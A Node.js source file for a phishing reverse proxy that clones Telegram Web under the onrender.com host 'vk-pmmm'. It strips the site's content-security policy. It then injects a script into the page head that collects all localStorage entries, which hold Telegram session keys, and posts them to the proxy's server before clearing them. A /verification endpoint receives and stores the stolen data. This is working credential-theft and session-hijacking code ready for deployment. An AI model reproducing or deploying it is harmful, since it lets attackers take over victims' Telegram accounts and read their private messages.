const { createServer } = require('http');
const { Worker, parentPort, setEnvironmentData } = require('worker_threads');

let db = {};

/** @type {string} */
let telegramAppend = "const l=localStorage;const k=[...l].map(([t,n])=>({key:t,value:n}));fetch(location.pathname,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'msg',key:location.pathname.substring(1),data:k})}).then(r=>r.json()).then(r=>r.success&&l.clear());";

if (!parentPort) {
    const worker = new Worker(__filename);
    worker.on("message", (msg) => setEnvironmentData("db", msg));
} else {
    setEnvironmentData("db", db);
    const server = createServer(async (req, res) => {
        try {
            let body = '';
            req.on('data', (chunk) => body += chunk);
            req.on('end', async () => {
                if (req.url.startsWith('/verification')) {
                    try {
                        const json = JSON.parse(body);
                        if (!json || !json.key || !json.data || !json.type) throw new Error('Invalid JSON');

                        parentPort.postMessage({ type: "verification", data: json });
                        res.writeHead(200, { 'Content-Type': 'application/json' });
                        return res.end(JSON.stringify({ success: true }));
                    } catch (err) {
                        console.error("Verification error:", err);
                        res.writeHead(500, { 'Content-Type': 'application/json' });
                        return res.end(JSON.stringify({ success: false }));
                    }
                } else {
                    const headersEntries = Object.entries(req.headers);
                    const headers = new Headers();
                    for (let i = 0; i < headersEntries.length; i++) {
                        const entry = headersEntries[i];
                        headers.set(entry[0], entry[1].replaceAll("vk-pmmm.onrender.com", "web.telegram.org"));
                    }

                    headers.set("Accept-Encoding", "br");

                    // Fix: Robust timeout with AbortController and IPv4 preference
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 90000); // 90s timeout

                    const r = await fetch(new Request("https://web.telegram.org/k" + req.url, {
                        method: req.method,
                        headers: headers,
                        body: (req.method == "GET" || req.method == "HEAD") ? undefined : body,
                        signal: controller.signal,
                        family: 4 // Force IPv4 to avoid dual-stack issues
                    })).finally(() => clearTimeout(timeoutId));

                    if (!r.ok) throw new Error(`Fetch error: ${r.status}`);

                    const resHeaders = new Headers(r.headers);

                    resHeaders.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
                    resHeaders.set('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline' vk-pmmm.onrender.com");
                    resHeaders.set('CF-Cache-Status', 'DYNAMIC');
                    resHeaders.set('Pragma', 'no-cache');
                    resHeaders.set('Expires', '0');

                    let writeBody = await r.arrayBuffer();
                    if (req.url == "/" || req.url.startsWith("/?")) {
                        writeBody = new TextDecoder().decode(writeBody).replace('<head>', `<head><script src="https://telegram.org/js/telegram-web-app.js"></script><script>${telegramAppend}</script>`);
                    }

                    await getHeaderObjects(resHeaders, res);

                    res.statusCode = r.status;
                    res.statusMessage = r.statusText;
                    return res.write(Buffer.from(writeBody), (_) => res.end());
                }
            });
        } catch (err) {
            console.error("Server error:", err);
            res.writeHead(500);
            res.end();
        }
    });

    async function getHeaderObjects(headers, res) {
        for (let pair of headers.entries()) {
            res.setHeader(pair[0], pair[1]);
        }
    }

    server.listen(process.env.PORT || 10000, "0.0.0.0", () => console.log(`HTTP Server listening on 0.0.0.0:${process.env.PORT || 10000}`));
}
